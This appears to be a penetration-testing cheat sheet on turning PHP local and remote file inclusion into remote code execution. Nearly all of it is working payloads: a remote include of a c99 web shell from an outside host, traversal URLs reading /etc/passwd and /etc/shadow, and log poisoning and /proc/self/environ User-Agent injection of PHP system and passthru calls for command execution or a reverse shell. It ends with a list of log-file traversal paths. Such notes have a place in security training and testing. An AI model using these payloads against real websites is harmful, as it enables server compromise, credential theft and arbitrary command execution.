# LFI to RCE

#### URL:
1. https://www.exploit-db.com/papers/12992/

## File Inclusion
#### RFI
Injecting PHP script into target website, by means of including "external" files.

    http://www.hackme.com/index.php?page=http://www.cwh.org/c99.php?

NOTE: Addition of "?" at end of URL, fetch intended file with the appended string as a parameter.

#### LFI
Including "internal" files in a victim website. Often used to get `/etc/passwd` or `/etc/shadow`.

    http://www.hackme.com/index.php?template=../../../../etc/passwd%00

NOTE: "%00" (Null char) wil ignore everything that comes after it.

## LFI <> RCE
In the following examples, the environment in Unix-environments can be used to gain RCE privileges on the system. Mostly through the interface.

#### Apache Log - Access

1. Locate the Apache access.log-file

        /var/log/apache2/access.log
        curl -i LFI_URL?page=/var/log/apache2/access.log --cookie "COOKIE_INFO" -L

2. Make a request making it possible to execute commands (RCE). (Telnet, Netcat or Perl socket)

        telnet 127.0.0.1 80
        GET /<?php system($_GET['cmd']); ?> HTTP/1.1_

3. Use the browser for a reverse shell or cmd execution

        http://127.0.0.1/index.php?page=APACHE_LOG_FILE&cmd=ls

#### Apache Log - Error

1. Locate the Apache error.log-file

        /var/log/apache2/error.log
        curl -i LFI_URL?page=/var/log/apache2/error.log --cookie "COOKIE_INFO" -L

#### /proc/self/environ
When we request to PHP page, new process will be created. In Unix system, Each process has its own /proc entry. /proc/self/ is a static path and symbolic link from lastest process	used that contain useful information. If we inject malicious code into /proc/self/environ, we	can run arbitrary command from target via LFI. We use the **user-agent**.

1. Location of environ

        /proc/self/environ

2. Use "User Agent Switcher Add-ons" for Firefox or Burp to change User-Agent.

        User-Agent: <?passthru($_GET[cmd])?>_

3. Use the browser for a reverse shell or cmd execution

        http://127.0.0.1/index.php?page=/proc/self/environ&cmd=ls


##### EXTRA
###### Apache log files
For Apache logs:

    ../apache/logs/error.log
    ../apache/logs/access.log
    ../../apache/logs/error.log
    ../../apache/logs/access.log
    ../../../apache/logs/error.log
    ../../../apache/logs/access.log
    ../../../../../../../etc/httpd/logs/acces_log
    ../../../../../../../etc/httpd/logs/acces.log
    ../../../../../../../etc/httpd/logs/error_log
    ../../../../../../../etc/httpd/logs/error.log
    ../../../../../../../var/www/logs/access_log
    ../../../../../../../var/www/logs/access.log
    ../../../../../../../usr/local/apache/logs/access_ log
    ../../../../../../../usr/local/apache/logs/access. log
    ../../../../../../../var/log/apache/access_log
    ../../../../../../../var/log/apache2/access_log
    ../../../../../../../var/log/apache/access.log
    ../../../../../../../var/log/apache2/access.log
    ../../../../../../../var/log/access_log
    ../../../../../../../var/log/access.log
    ../../../../../../../var/www/logs/error_log
    ../../../../../../../var/www/logs/error.log
    ../../../../../../../usr/local/apache/logs/error_l og
    ../../../../../../../usr/local/apache/logs/error.l og
    ../../../../../../../var/log/apache/error_log
    ../../../../../../../var/log/apache2/error_log
    ../../../../../../../var/log/apache/error.log
    ../../../../../../../var/log/apache2/error.log
    ../../../../../../../var/log/error_log
    ../../../../../../../var/log/error.log
